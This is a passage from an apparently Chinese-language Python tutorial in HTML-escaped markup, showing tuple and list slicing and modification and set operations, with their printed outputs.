&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;tuple&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出第一个元素&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;tuple&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出第二个到第三个元素&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# (1.2, &#39;test&#39;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;tuple&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出所有元素&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# (1, 1.2, &#39;test&#39;, &#39;dou&#39;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;tuple&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出所有元素&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# (1, 1.2, &#39;test&#39;, &#39;dou&#39;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;tuple&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出第三个及前面的所有&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# (1, 1.2, &#39;test&#39;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;tuple&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# (1, 1.2, &#39;test&#39;, &#39;dou&#39;, 1, 1.2, &#39;test&#39;, &#39;dou&#39;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;tuple&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; tuple2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# (1, 1.2, &#39;test&#39;, &#39;dou&#39;, 1, &#39;test2&#39;)&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
()
(1, 1.2, &#39;test&#39;, &#39;dou&#39;)
(1,)
1
(1.2, &#39;test&#39;)
(1, 1.2, &#39;test&#39;, &#39;dou&#39;)
(1, 1.2, &#39;test&#39;, &#39;dou&#39;)
(1, 1.2, &#39;test&#39;)
(1, 1.2, &#39;test&#39;, &#39;dou&#39;, 1, 1.2, &#39;test&#39;, &#39;dou&#39;)
(1, 1.2, &#39;test&#39;, &#39;dou&#39;, 1, &#39;test2&#39;)
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;可变数据&#34;&gt;&lt;a href=&#34;#可变数据&#34; class=&#34;headerlink&#34; title=&#34;可变数据&#34;&gt;&lt;/a&gt;可变数据&lt;/h3&gt;&lt;h4 id=&#34;List-列表&#34;&gt;&lt;a href=&#34;#List-列表&#34; class=&#34;headerlink&#34; title=&#34;List(列表)&#34;&gt;&lt;/a&gt;List(列表)&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;索引截取方式与元组相同&lt;/li&gt;
&lt;li&gt;截取后成为一个新列表&lt;/li&gt;
&lt;li&gt;元素在打方括号中，以逗号分隔&lt;/li&gt;
&lt;li&gt;列表的元素可改变&lt;/li&gt;
&lt;li&gt;元素可以是元组&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1.2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;999&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
list2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出完整列表&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [&#39;test&#39;, 1, 1.2, 999]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出列表第一个元素&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# test&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 从第二个开始输出到第三个元素&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [1, 1.2]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出从第三个元素开始的所有元素&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [1.2, 999]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list2 &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出两次列表&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [1, &#39;test&#39;, 1, &#39;test&#39;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; list2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 连接列表&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [&#39;test&#39;, 1, 1.2, 999, 1, &#39;test&#39;]&lt;/span&gt;
list3 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [1, 2, 3, 4, 5]&lt;/span&gt;
list3&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 修改第一元素&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [&#39;test&#39;, 2, 3, 4, 5]&lt;/span&gt;
list3&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;33&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 修改第三个到第四元素&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [&#39;test&#39;, 2, 22, 33, 5]&lt;/span&gt;
list4 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list4&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [1, 2, 3, 4, 5]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list4&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 第一个-1表示从最后一个开始&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 中间为空表示移动到列表末,最后一个-1为步长,-表示逆向&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list4&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [4, 3, 2]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list4&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [5]&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
[&#39;test&#39;, 1, 1.2, 999]
test
[1, 1.2]
[1.2, 999]
[1, &#39;test&#39;, 1, &#39;test&#39;]
[&#39;test&#39;, 1, 1.2, 999, 1, &#39;test&#39;]
[1, 2, 3, 4, 5]
[&#39;test&#39;, 2, 3, 4, 5]
[&#39;test&#39;, 2, 22, 33, 5]
[1, 2, 3, 4, 5]
[5, 4, 3, 2, 1]
[4, 3, 2]
[5]
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;Set-集合&#34;&gt;&lt;a href=&#34;#Set-集合&#34; class=&#34;headerlink&#34; title=&#34;Set(集合)&#34;&gt;&lt;/a&gt;Set(集合)&lt;/h4&gt;&lt;p&gt;创建格式&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;parame &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;value1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; value2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; ……&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;or&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;value&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 创建一个空集合&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;sites &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;123&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sites&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出集合，重复的元素被自动去掉&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {1, &#39;123&#39;, &#39;test&#39;}&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 成员测试&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; sites&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test 在集合中&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test 不在集合中&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# set可以进行集合运算&lt;/span&gt;
a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;abracadabra&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;alacazam&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# a 和 b 的差集&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# a 和 b 的并集&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# a 和 b 的交集&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# a 和 b 中不同时存在的元素&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
{1, &#39;123&#39;, &#39;test&#39;}
test 在集合中
{&#39;a&#39;, &#39;b&#39;, &#39;r&#39;, &#39;c&#39;, &#39;d&#39;}
{&#39;b&#39;, &#39;d&#39;, &#39;r&#39;}
{&#39;a&#39;, &#39;m&#39;, &#39;r&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;l&#39;, &#39;z&#39;}
{&#39;c&#39;, &#39;a&#39;}
{&#39;d&#39;, &#39;l&#39;, &#39;r&#39;, &#39;m&#39;, &#39;z&#39;, &#39;b&#39;}
